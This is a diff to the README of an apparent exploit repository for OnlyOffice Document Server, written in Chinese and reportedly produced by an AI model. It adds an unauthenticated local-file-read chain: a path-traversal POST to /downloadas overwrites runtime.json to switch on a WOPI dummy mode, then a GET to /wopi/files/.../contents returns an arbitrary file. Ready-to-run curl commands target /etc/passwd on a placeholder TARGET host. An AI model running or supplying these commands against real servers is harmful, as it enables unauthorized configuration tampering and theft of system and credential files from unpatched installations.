@@ -1,4 +1,4 @@
-# OnlyOffice Document Server Unauthenticated RCE
+# OnlyOffice Document Server Unauthenticated RCE and LFI
 
 # 完全由glm5.3flash驱动 测试环境是windows，linux环境需要修改脚本
 
@@ -110,3 +110,27 @@ node sources/server.js
 | `FileConverter/sources/converter.js:1118-1148` | x2t/docbuilder 路径经 getCfg 动态读取 |
 | `FileConverter/sources/converterPaths.js:60` | 绝对路径原样放行 |
 | `DocService/sources/converterservice.js:460` | /docbuilder 免鉴权任务入口 |
+
+
+# LFI部分
+
+```
+[1] POST /downloadas  ──写原语──▶  覆写 /var/www/onlyoffice/Data/runtime.json
+        {"wopi":{"enable":true,"dummy":{"enable":true,"sampleFilePath":"<目标>"}}}
+        (runtime.json 是 node-config 覆盖层 → 只写这几个键，其余回退基础配置；200ms 热加载，无需重启)
+[2] GET  /wopi/files/<docid>/contents  ──▶  回吐该文件
+        源码 server.js:359 → apicache → checkWopiDummyEnable → wopiClient.dummyGetFile
+        dummyGetFile: ctx.getCfg('wopi.dummy.sampleFilePath') + createReadStream()  ← 无任何路径 confinement
+```
+
+路由只挂了 `apicache` + `checkWopiDummyEnable`，没有 JWT、没有 checkClientIp → 纯未授权。默认 `wopi.enable` / `wopi.dummy.enable` 都是 `false`，所以必须先用写原语打开（三个键全是每请求 ctx.getCfg 读，改完即刻生效）。
+
+## POC
+
+```BASH
+# A) 写 runtime.json（换成你要读的文件）
+curl -sS -X POST 'http://TARGET/downloadas/x?cmd=%7B%22c%22%3A%20%22save%22%2C%20%22id%22%3A%20%22.%22%2C%20%22savekey%22%3A%20%22.%22%2C%20%22savetype%22%3A%203%2C%20%22format%22%3A%20%22/../../../../../../../../../../../../var/www/onlyoffice/Data/runtime.json%22%7D' -H 'Content-Type: text/plain' --data-binary '{"wopi":{"enable":true,"dummy":{"enable":true,"sampleFilePath":"/etc/passwd"}}}'
+
+# B) 触发读取（docid 随便填，换新 docid 绕开 5 分钟 apicache）
+curl -sS 'http://TARGET/wopi/files/rd1/contents'
+```
